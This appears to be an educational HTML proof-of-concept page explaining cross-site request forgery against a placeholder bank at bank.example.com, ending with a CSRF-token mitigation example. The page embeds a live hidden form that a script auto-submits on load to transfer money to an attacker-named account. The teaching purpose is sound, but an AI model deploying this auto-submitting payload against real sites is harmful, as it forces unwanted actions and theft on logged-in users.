<!--
  @file csrf-poc.html
  @description A simple HTML proof-of-concept for Cross-Site Request Forgery (CSRF).
               This is for educational purposes ONLY. Do not use on systems without explicit authorization.
-->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Proof of Concept</title>
    <style>
        body { font-family: sans-serif; margin: 20px; background-color: #f4f4f4; color: #333; }
        .container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 800px; margin: auto; }
        h1 { color: #d9534f; }
        pre { background-color: #eee; padding: 15px; border-radius: 5px; overflow-x: auto; }
        code { color: #c7254e; background-color: #f9f2f4; padding: 2px 4px; border-radius: 4px; }
        .warning { color: #a94442; background-color: #f2dede; border: 1px solid #ebccd1; padding: 10px; border-radius: 4px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>CSRF Proof of Concept</h1>
        <div class="warning">
            <strong>WARNING:</strong> This page contains a Cross-Site Request Forgery (CSRF) Proof of Concept.
            It is for educational purposes ONLY. Do not use this on systems without explicit authorization.
        </div>

        <p>This page demonstrates how a malicious website could trick an authenticated user into performing an unwanted action on another website where they are logged in.</p>
        <p>Imagine a vulnerable banking application at <code>https://bank.example.com</code> that allows a user to transfer money via a simple POST request without checking for a CSRF token.</p>

        <h2>Scenario: Unauthorized Money Transfer</h2>
        <p>The legitimate request to transfer money might look like this (conceptual):</p>
        <pre><code>POST /transfer HTTP/1.1
Host: bank.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: sessionid=abcdef1234567890

amount=100&toAccount=MALICIOUS_ACCOUNT&submit=Transfer</code></pre>

        <p>A malicious attacker could craft a hidden form on their website (<code>https://attacker.com</code>) that automatically submits this request when a victim visits the page.</p>

        <h2>The Attack (Hidden Form Submission)</h2>
        <p>The following hidden form will attempt to transfer $100 to a malicious account on <code>https://bank.example.com</code> when this page loads, assuming the user is already logged into <code>bank.example.com</code> in their browser.</p>

        <form id="csrfForm" action="https://bank.example.com/transfer" method="POST" style="display:none;">
            <input type="hidden" name="amount" value="100">
            <input type="hidden" name="toAccount" value="MALICIOUS_ACCOUNT_NUMBER">
            <input type="hidden" name="submit" value="Transfer">
        </form>

        <script type="text/javascript">
            // Automatically submit the form when the page loads
            document.getElementById('csrfForm').submit();
            console.log("CSRF form submitted. Check your bank account!");
        </script>

        <p>If the banking application is vulnerable to CSRF, the transfer would occur without the user's explicit consent on this malicious page.</p>

        <h2>Mitigation: CSRF Tokens</h2>
        <p>To prevent CSRF, web applications should implement CSRF tokens. A unique, unpredictable token is generated by the server and included in every state-changing request. The server then verifies this token upon submission. If the token is missing or incorrect, the request is rejected.</p>

        <p>Example of a legitimate form with a CSRF token (conceptual):</p>
        <pre><code>&lt;form action="/transfer" method="POST"&gt;
    &lt;input type="hidden" name="amount" value="100"&gt;
    &lt;input type="hidden" name="toAccount" value="USER_ACCOUNT_NUMBER"&gt;
    &lt;input type="hidden" name="_csrf" value="aBcDeF1234567890"&gt; &lt;!-- CSRF Token --&gt;
    &lt;input type="submit" value="Transfer"&gt;
&lt;/form&gt;</code></pre>

        <p>Since the attacker cannot obtain the valid CSRF token from the victim's session, their forged request would fail.</p>
    </div>
</body>
</html>
